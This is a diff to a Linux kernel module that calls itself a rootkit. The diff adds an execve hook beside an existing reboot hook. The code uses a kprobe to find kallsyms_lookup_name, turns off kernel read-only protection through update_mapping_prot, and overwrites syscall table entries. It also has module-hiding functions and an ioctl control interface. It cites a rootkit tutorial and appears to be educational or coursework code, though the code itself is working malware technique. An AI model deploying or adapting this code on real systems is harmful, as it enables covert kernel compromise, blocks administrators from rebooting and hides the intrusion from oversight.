@@ -4,6 +4,8 @@
 #include <linux/cdev.h>
 #include <linux/kprobes.h>
 #include <linux/kallsyms.h>
+#include <linux/syscalls.h>
+#include <asm/syscall.h>
 
 #include "rootkit.h"
 
@@ -20,9 +22,12 @@ static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name",
 };
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+static kallsyms_lookup_name_t kk_lookup_name;
 unsigned long *sys_call_table_;
 #define __NR_reboot 142
+#define __NR_execve 221
 static asmlinkage long (*orig_reboot)(const struct pt_regs *);
+static asmlinkage long (*orig_execve)(const struct pt_regs *);
 static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
 					phys_addr_t size, pgprot_t prot);
 
@@ -44,7 +49,8 @@ static void unhide_rootkit(void);
 /******************* hook syscall ******************/
 static int rootkit_hook(void);
 static int rootkit_unhook(void);
-static asmlinkage long hook_reboot(const struct pt_regs *);
+static asmlinkage long reboot_hook(const struct pt_regs *);
+static asmlinkage long execve_hook(const struct pt_regs *);
 static void write_protection_enable(void);
 static void write_protection_disable(void);
 
@@ -80,25 +86,39 @@ static void unhide_rootkit(void)
 */
 static unsigned long kprobe_lookup_symbol(const char *name)
 {
-	static kallsyms_lookup_name_t kallsyms_lookup_name;
-	kallsyms_lookup_name = NULL;
+
+	kk_lookup_name = NULL;
 	int ret = 0;
 
-	if(!kallsyms_lookup_name) {
+	if (!kk_lookup_name) {
 		ret = register_kprobe(&kp);
-		if(ret < 0) {
-			pr_info("rootkit: kprobe failed: %d\n", ret);
+		if(ret < 0){
+			pr_info("rootkit: fail to kprobe.\n");
 		}
-		kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+		kk_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 		unregister_kprobe(&kp);
 	}
-	pr_info("rootkit: lookup %s\n", name);
-	return kallsyms_lookup_name(name);
+	return kk_lookup_name(name);
 }
 
-static asmlinkage long hook_reboot(const struct pt_regs *regs)
+static asmlinkage long reboot_hook(const struct pt_regs *regs)
 {
 	return 0;
+}
+
+/**
+ * ref: https://xcellerator.github.io/posts/linux_rootkits_02/
+*/
+asmlinkage long execve_hook(const struct pt_regs *regs)
+{
+	char __user *pathname_u = (char *)regs->regs[0];
+	char pathname[NAME_MAX] = {0};
+
+	strncpy_from_user(pathname, pathname_u, NAME_MAX);
+
+	/* print out the pathname before calling system call */
+	pr_info("exec %s\n", pathname);
+	return orig_execve(regs);
 }
 
 /**
@@ -111,9 +131,9 @@ static void write_protection_disable()
 	update_mapping_prot = 
 		(void*)kprobe_lookup_symbol("update_mapping_prot");
 	start_rodata =
-		(unsigned long)kprobe_lookup_symbol("__start_rodata");
+		(unsigned long)kk_lookup_name("__start_rodata");
 	init_begin =
-		(unsigned long)kprobe_lookup_symbol("__init_begin");
+		(unsigned long)kk_lookup_name("__init_begin");
 
 	section_size = init_begin - start_rodata;
 	update_mapping_prot(__pa_symbol(start_rodata), start_rodata,
@@ -128,11 +148,11 @@ static void write_protection_enable()
 	unsigned long start_rodata, init_begin, section_size;
 
 	update_mapping_prot = 
-		(void*)kprobe_lookup_symbol("update_mapping_prot");
+		(void*)kk_lookup_name("update_mapping_prot");
 	start_rodata =
-		(unsigned long)kprobe_lookup_symbol("__start_rodata");
+		(unsigned long)kk_lookup_name("__start_rodata");
 	init_begin =
-		(unsigned long)kprobe_lookup_symbol("__init_begin");
+		(unsigned long)kk_lookup_name("__init_begin");
 
 	section_size = init_begin - start_rodata;
 	update_mapping_prot(__pa_symbol(start_rodata), start_rodata,
@@ -152,8 +172,10 @@ static int rootkit_hook(void)
 		write_protection_disable();
 
 		orig_reboot = (void *)sys_call_table_[__NR_reboot];
+		orig_execve = (void *)sys_call_table_[__NR_execve];
 
-		sys_call_table_[__NR_reboot] = (long)hook_reboot;
+		sys_call_table_[__NR_reboot] = (long)reboot_hook;
+		sys_call_table_[__NR_execve] = (long)execve_hook;
 
 		write_protection_enable();
 		//preempt_enable();
@@ -168,13 +190,14 @@ static int rootkit_hook(void)
 static int rootkit_unhook(void)
 {
 	if(hooked) {
-		//preempt_disable();
+		preempt_disable();
 		write_protection_disable();
 
 		sys_call_table_[__NR_reboot] = (unsigned long)orig_reboot;
+		sys_call_table_[__NR_execve] = (unsigned long)orig_execve;
 		
 		write_protection_enable();
-		//preempt_enable();
+		preempt_enable();
 		hooked = false;
 	} else {
 		pr_info("rootkit: Not hooked syscalls yet.\n");
@@ -191,7 +214,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
 	switch (ioctl) {
 	case IOCTL_MOD_HOOK:
-		rootkit_hook();
+		ret = rootkit_hook();
 		break;
 	case IOCTL_MOD_HIDE:
         if(hidden)
@@ -256,8 +279,8 @@ static void __exit rootkit_exit(void)
 {
 	rootkit_unhook();
 	pr_info("rootkit: removed\n");
-    	cdev_del(kernel_cdev);
-    	unregister_chrdev_region(major, 1);
+	cdev_del(kernel_cdev);
+	unregister_chrdev_region(major, 1);
 }
 
 module_init(rootkit_init);
